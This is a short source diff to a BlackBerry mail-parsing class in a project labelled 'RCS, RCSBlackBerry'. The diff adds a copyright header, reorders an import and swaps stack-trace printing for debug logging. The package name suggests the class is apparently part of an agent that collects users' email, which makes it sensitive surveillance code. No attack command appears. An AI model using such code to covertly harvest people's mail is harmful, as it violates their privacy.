@@ -1,9 +1,18 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 package blackberry.agent.mail;
 
 import java.io.UnsupportedEncodingException;
 import java.util.Enumeration;
 
+import net.rim.blackberry.api.mail.BodyPart.ContentType;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MimeBodyPart;
 import net.rim.blackberry.api.mail.Multipart;
@@ -11,7 +20,6 @@ import net.rim.blackberry.api.mail.SupportedAttachmentPart;
 import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
-import net.rim.blackberry.api.mail.BodyPart.ContentType;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -63,8 +71,7 @@ public class MailParser {
                     + Utils.byteArrayToHex(content.getBytes("UTF-8")));
 
         } catch (final UnsupportedEncodingException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            debug.error("parse: " + e);
         }
         //#endif
 
@@ -261,8 +268,7 @@ public class MailParser {
             debug.trace("UTF8: "
                     + Utils.byteArrayToHex(content.getBytes("UTF-8")));
         } catch (final UnsupportedEncodingException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            debug.error("readEmailBody: " + e);
         }
         //#endif
 
